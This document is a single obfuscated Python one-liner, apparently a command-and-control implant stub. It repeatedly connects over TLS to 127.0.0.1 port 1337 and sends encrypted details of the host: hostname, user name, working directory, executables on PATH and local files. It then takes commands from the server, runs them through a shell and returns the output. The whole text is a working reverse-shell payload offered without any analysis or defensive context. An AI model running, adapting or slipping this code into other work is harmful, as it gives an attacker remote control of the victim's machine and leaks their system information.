python3 -c "exec('from json import dumps;from platform import node as h;from socket import socket as b;from os.path import exists as w;from getpass import getuser as i;from sys import argv,stderr,exit;from contextlib import suppress as q;from subprocess import run,PIPE as z;from ssl import _create_unverified_context as u;from os import getcwd as j,environ as n,listdir as l,name,urandom as y;x=True;k=b\\x22abcd\\x22\\r\\ndef e(p,d=False):\\r\\n	if d:v=p[:256];p=p[256:]\\r\\n	else:v=y(256)\\r\\n	j,S,o=0,list(range(256)),[]\\r\\n	for i in range(256):j=(j+S[i]+k[i%len(k)])%256;S[i],S[j]=S[j],S[i]\\r\\n	S = [v[i]^c for i,c in enumerate(S)];i=j=0\\r\\n	for c in p:i=(i+1)%256;j=(j+S[i])%256;S[i],S[j]=S[j],S[i];o.append(c^S[(S[i]+S[j])%256])\\r\\n	if d:return bytes(o)\\r\\n	return v+bytes(o)\\r\\ndef g():return [f for d in n[\\x22PATH\\x22].split(\\x22:\\x22 if name \x21= \\x22nt\\x22 else \\x22;\\x22) if w(d) for f in l(d)]\\r\\ndef a(d):\\r\\n	c,d=d[:30000],d[30000:]\\r\\n	while c:s.sendall(c);c=d[:30000];d=d[30000:]\\r\\nf=b\\x22POST / HTTP/1.0\\\\r\\\\nContent-Type: {type}\\\\r\\\\nHost: 127.0.0.1\\\\r\\\\nContent-Length: {length}\\\\r\\\\n\\\\r\\\\n\\x22;c=u()\\r\\nwhile x:\\r\\n	with q(Exception):\\r\\n		r=b\\x22\\x22\\r\\n		while r\x21=b\\x22\\\\6\\x22:\\r\\n			s=b();s.connect((\\x22127.0.0.1\\x22,1337));d=e(b\\x22\\\\1\\x22+dumps({\\x22hostname\\x22:h(),\\x22user\\x22:i(),\\x22cwd\\x22:j(),\\x22executables\\x22:g(),\\x22files\\x22:l()}).encode());s=c.wrap_socket(s);a(f.replace(b\\x22{type}\\x22,b\\x22application/json; charset=utf-8\\x22).replace(b\\x22{length}\\x22,str(len(d)).encode(\\x22latin-1\\x22))+d);r=e(s.recv(65535).split(b\\x22\\\\r\\\\n\\\\r\\\\n\\x22,1)[1],x);s.close()\\r\\n		d=b\\x22 \\x22\\r\\n		while x:\\r\\n			s=b();s.connect((\\x22127.0.0.1\\x22, 1337));s=c.wrap_socket(s);a(f.replace(b\\x22{type}\\x22,b\\x22text/plain; charset=utf-8\\x22).replace(b\\x22{length}\\x22,str(len(d)).encode(\\x22latin-1\\x22))+e(d));m=e(s.recv(65535).split(b\\x22\\\\r\\\\n\\\\r\\\\n\\x22,1)[1],x).decode();p=run(m,shell=x,stdout=z,stderr=z);d=p.stdout+p.stderr or b\\x22 \\x22;s.close()')"
